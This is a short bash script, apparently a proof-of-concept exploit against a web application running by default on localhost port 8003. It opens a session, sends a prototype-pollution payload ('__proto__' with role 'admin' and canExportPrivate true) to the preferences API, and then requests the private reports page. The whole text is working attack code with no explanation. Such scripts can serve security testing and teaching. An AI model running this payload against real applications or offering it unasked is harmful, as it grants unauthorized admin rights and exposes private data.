#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${1:-http://127.0.0.1:8003}"
JAR="$(mktemp)"
trap 'rm -f "$JAR"' EXIT

curl -s -c "$JAR" "$BASE_URL/" >/dev/null
curl -s -b "$JAR" -c "$JAR" \
  -H 'content-type: application/json' \
  -d '{"__proto__":{"role":"admin","canExportPrivate":true}}' \
  "$BASE_URL/api/preferences" >/dev/null
curl -s -b "$JAR" "$BASE_URL/reports/private"

